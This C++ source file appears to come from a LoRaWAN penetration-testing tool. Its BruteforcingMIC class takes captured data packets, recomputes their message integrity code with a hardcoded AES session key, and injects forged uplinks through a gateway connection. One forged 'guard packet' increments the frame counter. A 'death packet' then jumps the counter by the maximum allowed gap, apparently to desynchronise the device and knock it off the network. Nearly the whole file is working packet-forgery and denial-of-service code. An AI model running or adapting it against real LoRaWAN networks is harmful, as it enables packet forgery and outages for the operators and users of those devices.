#include "bruteforcing_mic.h"

#include "Utils/common.h"
#include "Utils/jsonparser.h"

#include "Utils/logger.h"
#include <chrono>
#include <thread>

BruteforcingMIC::BruteforcingMIC()
{
//     auto startFactoring = std::chrono::high_resolution_clock::now();

//    for(unsigned long int i=1; i < 4294967295; i++)
//    {
//        micValues.emplace_back(Common::ulong2Bytes(i));
//    }

//    auto stop = std::chrono::high_resolution_clock::now();
//    auto duration = std::chrono::duration_cast<std::chrono::duration<int64_t, std::milli>>( stop - startFactoring ).count();
//    std::cout << "all MIC were generated in : " << duration  << " ms" << std::endl;

}

Lorawan_result BruteforcingMIC::sendGuardPacket( std::shared_ptr<DataPacket> dataPkt)
{
    std::string jsonToSend{};
    DataPacket copyPacket(dataPkt);

    unsigned long int ulCount = Common::bytes2ULong(copyPacket.getFrameCounter());

    ulCount += 1;

    copyPacket.setFrameCounter(Common::ulong2Bytes(ulCount));


    if(copyPacket.serialialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;


    if(calculateMIC(copyPacket) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;


    if(createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    std::chrono::milliseconds timespan(5000);
    std::this_thread::sleep_for(timespan);

    Tins::IP refIP = dataPkt->getPacketIP();
    uplink.setIP(refIP);
    writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));
    writeLog(Logger::BruteforcingMIC,"sending guard packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())));

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
    {
        writeLog(Logger::BruteforcingMIC,"error sending guard packet!");
    }

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt, bool changeFCnt)
{
    writeLog(Logger::BruteforcingMIC,"Calculating new MIC value");
    writeLog(Logger::BruteforcingMIC,"previous value of MIC: " + Common::bytes2HexStr(dataPkt.getMIC()) );

    bytes initBlock{};
    bytes _localFCnt{};
    bytes _msg{};

    bytes calcCMAC{};
    bytes frameCounter = dataPkt.getFrameCounter();

    initBlock.emplace_back(0x49);

    for(int i=0; i < 4; i++)
        initBlock.emplace_back(0x00);

    initBlock.emplace_back(0x00); // DIR


    bytes littleEndianDevAddr{};
    if(Common::convertToLittleEndian(dataPkt.getDevAddr(),littleEndianDevAddr) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorConvert2LittleEndian;
    }

    initBlock.insert(initBlock.end(),littleEndianDevAddr.begin(), littleEndianDevAddr.end());

    if(frameCounter.empty())
    {
        writeLog(Logger::BruteforcingMIC,"Empty frame counter");
        return Lorawan_result::ErrorCalcMIC;
    }
    _localFCnt.emplace_back(0x00);
    _localFCnt.emplace_back(0x00);

    if(frameCounter.size() == 1)
    {
        _localFCnt.emplace_back(0x00);
        _localFCnt.emplace_back(frameCounter.front());
    }
    else
    {
        _localFCnt.insert(_localFCnt.begin(), frameCounter.begin(), frameCounter.end());
    }
    if(changeFCnt)
    {
        unsigned long int dosCount = Common::bytes2ULong(_localFCnt);

        dosCount += MAX_FCNT_GAP;

        _localFCnt = Common::ulong2Bytes(dosCount);
        writeLog(Logger::BruteforcingMIC,"changed value of FCnt: " + Common::bytes2HexStr(_localFCnt));
    }

    bytes littleEndianFCnt{};
    if(Common::convertToLittleEndian(_localFCnt,littleEndianFCnt) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorConvert2LittleEndian;
    }

    
    initBlock.insert(initBlock.end(), littleEndianFCnt.begin(), littleEndianFCnt.end());

    initBlock.emplace_back(0x00);



    bytes _rawPacket = dataPkt.getRawData();
    bytes::iterator nextByte = _rawPacket.begin();

    while(nextByte != _rawPacket.end() -4)
    {
       _msg.emplace_back(*nextByte);
       nextByte++;
    }

    if(_msg.empty())
        return Lorawan_result::ErrorCalcMIC;

    initBlock.emplace_back(static_cast<byte>(_msg.size()));

    bytes key = {0xB4,0x2D,0x67,0x33,0xB7,0x3E,0xA4,0x5C,0xEB,0x53,0xCB,0xEE,0x4A,0xCA,0x5D,0x28};

    bytes message{};
    message.insert(message.begin(), initBlock.begin(), initBlock.end());
    message.insert(message.end(), _msg.begin(), _msg.end());

    if(Common::calculate_cmac(key,message, calcCMAC) != Lorawan_result::Success)
    {
        writeLog(Logger::BruteforcingMIC,"Error calculating CMAC");
        return Lorawan_result::ErrorCalcMIC;
    }

    dataPkt.setMIC(bytes(calcCMAC.begin(), calcCMAC.begin() + 4));

    writeLog(Logger::BruteforcingMIC,"Finished calculating MIC");
    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::sendDeathPacket(std::shared_ptr<DataPacket> dataPkt)
{
    std::string jsonToSend{};
    DataPacket copyPacket(dataPkt);

//    unsigned long int dosCount = Common::bytes2ULong(copyPacket.getFrameCounter());

//    dosCount += 1;

//    copyPacket.setFrameCounter(Common::ulong2Bytes(dosCount));
//    std::cout << "changed value of FCnt: " << Common::bytes2HexStr(copyPacket.getFrameCounter()) << std::endl;

    if(copyPacket.serialialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;

    if(calculateMIC(copyPacket, true) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;


    if(createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    std::chrono::milliseconds timespan(4000);
    std::this_thread::sleep_for(timespan);

    Tins::IP refIP = dataPkt->getPacketIP();
    uplink.setIP(refIP);
    writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));
    writeLog(Logger::BruteforcingMIC,"sending packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())));

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
    {
        writeLog(Logger::BruteforcingMIC,"error sending death packet!");
    }

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::setUpSending(std::shared_ptr<LorawanPacket> packet)
{
    //testDevice->setAppEUI(requestPkt->getAppEUI());
    //testDevice->setDevEUI(requestPkt->getDevEUI());
    testDevice->setEui64(packet->getEui64());

    uplink.setDstPort(packet->getDstPort());
    uplink.setSrcPort(packet->getSrcPort());

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::launch()
{
 PacketStorage *storage = PacketStorage::getInstance();

    std::vector<std::shared_ptr<JoinRequestPacket> > requests = storage->getRequestPacket();
    std::vector<std::shared_ptr<DataPacket> > macPayloads = storage->getMacPayloadPacket();

//    if(requests.size() > 0)
//    {
    if(macPayloads.size() > 0)
    {
        if(setUpSending(macPayloads.front()) != Lorawan_result::Success)
        {
            return Lorawan_result::ErrorTestSetUp;
        }

            std::shared_ptr<DataPacket> firstPayload = macPayloads.back(); // based on number

            if(sendGuardPacket(firstPayload) != Lorawan_result::Success)
            {
                return Lorawan_result::ErrorTestSetUp;
            }

            if(sendDeathPacket(firstPayload) != Lorawan_result::Success)
            {
                return Lorawan_result::ErrorTest;
            }

    } else
    {
        writeLog(Logger::BruteforcingMIC | Logger::LorawanTest,"no payload packets");
        return Lorawan_result::ErrorTest;
    }

//    }
//    else
//    {
//        std::cout << "no requests packets" << std::endl;
//        return Lorawan_result::ErrorTest;
//    }


    return Lorawan_result::Success;
}

Lorawan_result
BruteforcingMIC::createJsonToSend(bytes rawPacket, std::string refJson, std::string &jsonToSend)
{
    JsonParser jParser;

    if(jParser.parse(refJson) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    jsonToSend.clear();
    bytes encodedPacket{};

    if(Common::encodeBase64(rawPacket,encodedPacket) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    if(encodedPacket.empty())
        return Lorawan_result::ErrorCreatingPacket;

    std::string changedValue = Common::bytes2Str(encodedPacket);

    if(jParser.changeValue(jsonKeys({"rxpk","data"}),changedValue) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    jsonToSend = jParser.getJson();

    writeLog(Logger::BruteforcingMIC,"ref: \n" + refJson);
    writeLog(Logger::BruteforcingMIC," changed: \n" + jsonToSend );


    return Lorawan_result::Success;

}

Lorawan_result BruteforcingMIC::send(bytes magicFour, bytes eui64, std::string json)
{
    bytes rawData;
    bytes rawJson = Common::str2Bytes(json);

    rawData.insert(rawData.begin(),magicFour.begin(), magicFour.end());
    rawData.insert(rawData.end(),eui64.begin(), eui64.end());
    rawData.insert(rawData.end(),rawJson.begin(), rawJson.end());

    std::string dataToSend = Common::bytes2Str(rawData);

    writeLog(Logger::BruteforcingMIC, "data to send: \n" + dataToSend);

    return uplink.send(dataToSend);
}

Lorawan_result BruteforcingMIC::stop()
{
    return Lorawan_result::Success;
}


Lorawan_result BruteforcingMIC::printPackets()
{
    PacketStorage* storage = PacketStorage::getInstance();

    writeLog(Logger::BruteforcingMIC,"Able to perform bruteforcing attack with below packets:");

    std::vector<std::shared_ptr<JoinRequestPacket> > requestPackets = storage->getRequestPacket();
    std::vector<std::shared_ptr<JoinAcceptPacket> > acceptPackets = storage->getAcceptPacket();
    std::vector<std::shared_ptr<DataPacket> > dataPackets = storage->getMacPayloadPacket();

    writeLog(Logger::BruteforcingMIC,"Available packets:");
    writeLog(Logger::BruteforcingMIC,"Requests:" + std::to_string(requestPackets.size()));
    writeLog(Logger::BruteforcingMIC, "Accepts:" + std::to_string(acceptPackets.size()));
    writeLog(Logger::BruteforcingMIC,"Datas:" + std::to_string(dataPackets.size()));


    for(auto &request: requestPackets)
    {
        writeLog(Logger::BruteforcingMIC,"next request packet:");
        writeLog(Logger::BruteforcingMIC,Common::bytes2HexStr(request->getRawData()));
    }


    for(auto &accept: acceptPackets)
    {
        writeLog(Logger::BruteforcingMIC,"next accept packet:");
        writeLog(Logger::BruteforcingMIC,Common::bytes2HexStr(accept->getRawData()));
    }

    for(auto &data: dataPackets)
    {
        writeLog(Logger::BruteforcingMIC,"next data packet:");
        writeLog(Logger::BruteforcingMIC,Common::bytes2HexStr(data->getRawData()));
    }

    return Lorawan_result::Success;
}
